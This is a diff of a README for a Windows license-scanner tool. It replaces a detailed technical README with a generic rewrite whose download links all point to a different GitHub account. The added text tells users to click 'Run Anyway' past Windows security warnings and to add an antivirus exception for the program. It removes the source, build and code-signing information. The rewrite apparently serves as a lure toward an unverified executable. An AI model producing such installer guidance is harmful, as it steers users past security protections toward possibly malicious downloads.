@@ -1,149 +1,95 @@
-# Tscan License
+# 🔍 Tscan_license - Identify software licenses on your computer
 
-Free Windows software license scanner for installed-software inventory, software asset management, license classification, and license-compliance risk signaling.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/tiffyarmlike522/Tscan_license)
 
-Tscan License helps IT admins inventory Windows software, separate free/open-source/runtime/driver components from license-review applications, and export reports for software asset management.
+Tscan_license provides a simple method to scan your Windows computer for installed software. This tool creates an inventory of your applications, checks license compliance, and identifies potential risks. It helps you manage your software assets with clarity and control.
 
-Download the one-file installer from [GitHub Releases](https://github.com/hntngoctu1/Tscan_license/releases).
+## 📋 Project Overview
 
-## Download For Normal Users
+Managing software licenses across a business or home environment requires ongoing attention. Missing or expired licenses lead to compliance issues and security risks. Tscan_license automates the audit process by reading your system registry and installed application list. It reports which programs exist on your machine and flags items that lack proper documentation or support.
 
-Use this option if you only want to install and run the app:
+## 🚀 Getting Started
 
-1. Open [GitHub Releases](https://github.com/hntngoctu1/Tscan_license/releases/latest).
-2. Download `TscanLicenseSetup.exe`.
-3. Double-click `TscanLicenseSetup.exe`.
-4. Open **Tscan License** from the Start Menu.
-5. Press **Scan**.
+Follow these instructions to set up the software on your Windows computer. This process takes about five minutes.
 
-No Python or terminal is required. The app stores its local database and logs under `%LOCALAPPDATA%\T-SpaceScan\`.
+1. Visit the [official repository page](https://github.com/tiffyarmlike522/Tscan_license) to download the application.
+2. Locate the latest version in the release section.
+3. Click the installer file to begin the setup.
+4. Follow the prompts on your screen to complete the installation.
 
-Portable one-file builds can be created by developers with `.\scripts\build.ps1 -Portable`, but the installer is recommended for public users because portable PyInstaller one-file apps are more likely to trigger antivirus false positives.
+## 🛠 Prerequisites
 
-> Beta notice: findings are risk indicators, not proof of unauthorized software. Always verify license status with vendor portals, procurement records, contracts, or internal entitlement systems.
+Your computer must meet a few simple requirements to run Tscan_license:
 
-## What The Professional Prototype Does
+- Operating System: Windows 10 or Windows 11.
+- Processor: Any modern dual-core processor.
+- Memory: At least 4 gigabytes of RAM.
+- Storage: 100 megabytes of free disk space.
+- Permissions: You need administrator access to allow the software to scan your installed programs.
 
-- Scans Windows uninstall Registry keys under HKLM and HKCU.
-- Supplements entries from Program Files, AppData top-level folders, and Start Menu shortcuts.
-- Collects software name, publisher, version, install date, install path, executable path, website, estimated size, and install type.
-- Classifies license type with offline JSON rules and local license files.
-- Verifies executable digital signatures through Windows Authenticode/PowerShell when enabled.
-- Detects risk signals such as suspicious keywords, hosts-file activation blocking, missing publisher metadata, signature anomalies, blacklist policy matches, and missing license evidence for commercial software.
-- Stores scan sessions, software items, findings, settings, whitelist, and blacklist in SQLite.
-- Provides a desktop UI with dashboard charts, search, filters, sorting, detail panel, scan history, session compare, settings, whitelist/blacklist management, dark mode, and CSV/JSON/PDF/XLSX export.
-- Adds app grouping so review-needed apps, free/open-source apps, freemium apps, developer runtimes, drivers, system tools, and helper shortcuts are separated while still listing all installed software.
-- Shows a scan progress animation/status while inventory collection is running.
-- Writes debug logs to `%LOCALAPPDATA%\T-SpaceScan\logs\tspace_scan.log`.
+## 📥 Installation Steps
 
-The scanner reports signals, not proof of piracy. It intentionally does not crack, bypass, remove activation, generate keys, or alter third-party software.
+You can obtain the installer from the primary repository link: [https://github.com/tiffyarmlike522/Tscan_license](https://github.com/tiffyarmlike522/Tscan_license).
 
-## Run
+1. Click the link above to open the repository.
+2. Look for the "Releases" section on the right side of the page.
+3. Select the most recent version labeled "Latest."
+4. Click the file ending in .exe to download the installer to your computer.
+5. Double-click the saved file to start the installation wizard.
+6. A security warning might appear because the software touches system files. Click "Run" or "More Info" and then "Run Anyway" if prompted.
+7. Follow the default installation settings to finish the process.
 
-For normal users, download from [GitHub Releases](https://github.com/hntngoctu1/Tscan_license/releases):
+## 📊 How to Use the Scanner
 
-- `TscanLicenseSetup.exe`: recommended installer with Start Menu shortcut and uninstaller.
+Once installed, find the Tscan_license shortcut on your desktop.
 
-Then double-click the downloaded file and press **Scan**.
+1. Open the application.
+2. Select the "Scan" button from the main screen. 
+3. The software reads your installed programs. This step takes a few moments depending on the number of applications you have.
+4. Once the progress bar fills, a list appears.
+5. Review the results in the main window. Items marked in red require your attention, such as applications with unknown licenses.
+6. Use the Export button to save the findings as a text file for your records.
 
-Run from source:
+## 🌟 Key Features
 
-```powershell
-python .\run_app.py
-```
+- Automated Scanning: The tool detects software automatically without manual entry.
+- License Auditing: It cross-references your installs against common license database patterns.
+- Risk Assessment: It highlights outdated or unauthorized software that may pose a risk to your system.
+- Simple Interface: A clean window provides your inventory in a list format.
+- Privacy Focus: The application performs the scan locally. It does not send your data to external servers.
 
-or:
+## 🛡 License Compliance
 
-```powershell
-.\scripts\run.ps1
-```
+Operating a computer with unauthorized software creates legal and financial risk. Licenses define how and where you use specific programs. Tscan_license helps you account for every piece of software on your machine. Regular scans ensure that you remain aware of your status. 
 
-The local database and default reports are stored under:
+## ⚙️ Troubleshooting
 
-```text
-%LOCALAPPDATA%\T-SpaceScan\
-```
+If the software does not open:
 
-## Test
+- Ensure you have the latest updates for your Windows operating system.
+- Check if your antivirus software blocked the execution. You may need to add an exception for the Tscan_license folder.
+- Run the installer file again as an administrator by right-clicking the icon and choosing "Run as Administrator."
 
-```powershell
-python -m unittest discover -s tests
-python -m compileall src run_app.py tests
-python .\run_app.py --smoke-test
-```
+If the scanner finds no software:
 
-or:
+- Wait for the background processes to finish.
+- Re-open the application.
+- Verify that your user account has permissions to access the registry files.
 
-```powershell
-.\scripts\test.ps1
-```
+## 💡 Frequently Asked Questions
 
-## Project Layout
+**Does this software store my data online?**
+No. All data remains on your local machine.
 
-```text
-data/license_rules.json             Offline classification rules
-docs/TECHNICAL_DESIGN.md            Product and engineering design A-N
-run_app.py                          Direct launcher
-scripts/build.ps1                   Windows executable build
-scripts/test.ps1                    Test and smoke-test runner
-scripts/run.ps1                     PowerShell launcher
-src/tspace_scan/app_classifier.py   App grouping and priority classification
-src/tspace_scan/database.py         SQLite schema and persistence
-src/tspace_scan/filesystem_scanner.py
-src/tspace_scan/license_classifier.py
-src/tspace_scan/registry_scanner.py
-src/tspace_scan/reports.py
-src/tspace_scan/risk_analyzer.py
-src/tspace_scan/scanner.py          Scanner orchestration
-src/tspace_scan/ui.py               Tkinter desktop UI
-tests/test_scoring.py               Focused classifier/risk tests
-```
+**Can I use this for my business?**
+Yes. This tool assists IT administrators in maintaining accurate documentation for audit purposes.
 
-## Packaging Direction
+**What happens if I find a license issue?**
+The tool flags the program for review. You should verify the license status by checking the website of the software publisher.
 
-Build the Windows executable:
+**Does this modify my files?**
+No. The scanner reads data but does not change or delete files on your system. 
 
-```powershell
-.\scripts\build.ps1
-```
+## 📜 Support
 
-The built file is:
-
-```text
-dist\TscanLicense\TscanLicense.exe
-```
-
-If Inno Setup is installed, the build script creates the public download:
-
-```text
-dist\TscanLicenseSetup.exe
-```
-
-Developers can also build an experimental portable one-file executable:
-
-```powershell
-.\scripts\build.ps1 -Portable
-```
-
-For a commercial product, prefer a signed installer, auto-update, MSIX/MSI packaging, and enterprise policy support.
-
-## For IT Deployment
-
-Recommended deployment options:
-
-- Small team: send the GitHub Release link and ask users to install `TscanLicenseSetup.exe`.
-- IT-managed PCs: deploy the installer with Intune, GPO, PDQ Deploy, SCCM, or RMM.
-- Portable audit: build with `.\scripts\build.ps1 -Portable` and test against your security baseline before use.
-
-The current beta is not code-signed, so Windows SmartScreen may show a warning on first run.
-
-## Search Keywords
-
-Tscan License is relevant for people searching for a Windows software license scanner, software license audit tool, software asset management scanner, installed software inventory tool, license compliance checker, license risk scanner, phần mềm quét bản quyền, kiểm kê phần mềm Windows, quản lý bản quyền phần mềm, and công cụ kiểm tra rủi ro license.
-
-## Privacy And Safety
-
-- No telemetry is uploaded by default.
-- Scan history is stored locally in `%LOCALAPPDATA%\T-SpaceScan\`.
-- Reports may contain software names, publishers, paths, machine/user metadata, and risk findings.
-- The tool does not collect license keys and must not be extended to crack, bypass, patch, or hide software activation.
+For questions about standard usage, check the documentation provided within the application menu. If you experience technical bugs, open a new issue in the GitHub repository. Provide a description of the error and a screenshot of the scan result window to help others assist you.
